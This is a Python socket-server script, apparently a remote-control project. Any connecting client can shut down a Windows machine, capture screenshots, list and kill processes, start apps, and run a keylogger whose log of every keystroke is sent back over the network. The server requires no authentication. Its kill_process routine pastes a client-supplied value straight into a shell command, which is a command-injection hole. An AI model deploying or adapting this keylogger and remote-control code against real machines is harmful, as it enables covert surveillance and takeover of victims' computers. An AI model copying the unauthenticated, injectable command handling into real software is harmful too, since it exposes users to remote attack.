from concurrent.futures import thread
import socket
import threading
import os
import pyautogui
import time
import subprocess
from pynput import keyboard

# Commands
CMD_SHUTDOWN = 'shutdown'
CMD_TAKE_SCREENSHOT = 'screenshot'
CMD_VIEW_PROCESSES = 'view_processes'
CMD_KILL_PROCESS = 'kill_process'
CMD_START_KEYLOGGER = 'start_keylogger'
CMD_STOP_KEYLOGGER = 'stop_keylogger'
CMD_PRINT_KEYLOGGER = 'print_keylogger'
CMD_VIEW_APPS = 'view_apps'
CMD_START_APP = 'start_app'

# FLAGS
FLAG_FILE_END = 'FILE_END'
FLAG_PROCESSES_END = 'PROCESSES_END'
FLAG_APPS_END = 'APPS_END'

# BUFFER
BUFFER_SIZE = 1024

# SCREENSHOT
TMP_PATH = os.path.join(os.getcwd(), 'server/tmp')


class Server:
  def __init__(self):
    self.host = socket.gethostbyname_ex(socket.gethostname())[2][2]
    self.port = 5000
    self.addr = (self.host, self.port)
    self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    self.server.bind(self.addr)
    self.keylogger_listener = None

  def run(self):
    self.server.listen(5)
    print(f'Server is listening on {self.host}:{self.port}')
    while True:
      conn, addr = self.server.accept()
      thread = threading.Thread(target=self.handle_client, args=(conn, addr))
      thread.start()
      print(f"[ACTIVE CONNECTIONS] {threading.active_count() - 1}")

  # Handle client connection
  def handle_client(self, conn, addr):
    print(f"[NEW CONNECTION] {addr} connected.")
    connected = True
    while connected:
      data = conn.recv(BUFFER_SIZE)

      # Shutdown
      if data == CMD_SHUTDOWN.encode():
        self.shutdown(conn, addr)

      # Take screenshot
      elif data == CMD_TAKE_SCREENSHOT.encode():
        self.take_screenshot()
        self.send_file(os.path.join(TMP_PATH, 'screenshot.png'), conn)

      # View processes
      elif data == CMD_VIEW_PROCESSES.encode():
        processes = self.get_all_processes()
        conn.send(processes.encode())
        time.sleep(0.01)
        conn.send(FLAG_PROCESSES_END.encode())

      # Kill process
      elif data == CMD_KILL_PROCESS.encode():
        pid = conn.recv(BUFFER_SIZE).decode()
        self.kill_process(pid)

      # Start keylogger
      elif data == CMD_START_KEYLOGGER.encode():
        print('Starting keylogger')
        self.start_keylogger()

      # Stop keylogger
      elif data == CMD_STOP_KEYLOGGER.encode():
        print('Stopping keylogger')
        self.stop_keylogger()
      
      # Print keylogger
      elif data == CMD_PRINT_KEYLOGGER.encode():
        print('Printing keylogger')
        self.send_file(os.path.join(TMP_PATH, 'keylog.txt'), conn)

      # View apps
      elif data == CMD_VIEW_APPS.encode():
        apps = self.get_all_apps()
        conn.send(apps.encode())
        time.sleep(0.01)
        conn.send(FLAG_APPS_END.encode())

      # Start app
      elif data == CMD_START_APP.encode():
        print('Starting app')
        app_name = conn.recv(BUFFER_SIZE).decode()
        self.start_app(str(app_name))

    conn.close()
    print(f"[DISCONNECTED] {addr} disconnected.")

  def shutdown(self, conn, addr):
    print(f"[SHUTDOWN] {addr} disconnected.")
    print(f'Received shutdown command. Server is shutting down.')
    conn.close()
    os.system('shutdown -s -t 0')
    
  def take_screenshot(self):
    screenshot = pyautogui.screenshot()
    screenshot.save(os.path.join(TMP_PATH, 'screenshot.png'))
  
  def send_file(self, path, conn):
    if os.path.exists(path):
      f = open(path, 'rb')
      bytes = f.read(BUFFER_SIZE)
      while bytes:
        conn.send(bytes)
        bytes = f.read(BUFFER_SIZE)
      time.sleep(0.05)
      f.close()
      conn.send(FLAG_FILE_END.encode())

  def get_all_processes(self):
    return os.popen('wmic process get description, processid, threadcount').read()

  def kill_process(self, pid):
    # os.system(f'TASKKILL /f /t /PID {pid}')
    os.popen('wmic process where processid=' + pid + ' call terminate')

  def on_press(self, key):
      with open(os.path.join(TMP_PATH, 'keylog.txt'), 'a') as f:
      # Special charactersa
        if key == keyboard.Key.enter:
          key = '\n'
        if key == keyboard.Key.space:
          key = ' '
        if key == keyboard.Key.tab:
          key = '\t'
        if key == keyboard.Key.shift:
          key = '<shift>'
        if key == keyboard.Key.backspace:
          key = '<backspace>'
        if key == keyboard.Key.esc:
          key = '<esc>'
        if key == keyboard.Key.ctrl:
          key = '<ctrl>'

        key = str(key).replace("'", '')

        f.write(str(key))

  def start_keylogger(self):
    self.keylogger_listener = keyboard.Listener(on_press=self.on_press)
    self.keylogger_listener.start()
   
  def stop_keylogger(self):
    self.keylogger_listener.stop()

  def get_all_apps(self):
    cmd = 'powershell "gps | where {$_.MainWindowTitle } | select ProcessName, Id'
    proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE)
    apps = ""
    for line in proc.stdout:
      if line.rstrip():
        # only print lines that are not empty
        # decode() is necessary to get rid of the binary string (b')
        # rstrip() to remove `\r\n`
        apps += line.decode().rstrip()
        apps += "\n"
    return apps

  def start_app(self, app_name):
    os.startfile(app_name)

if __name__ == '__main__':
  server = Server()
  server.run()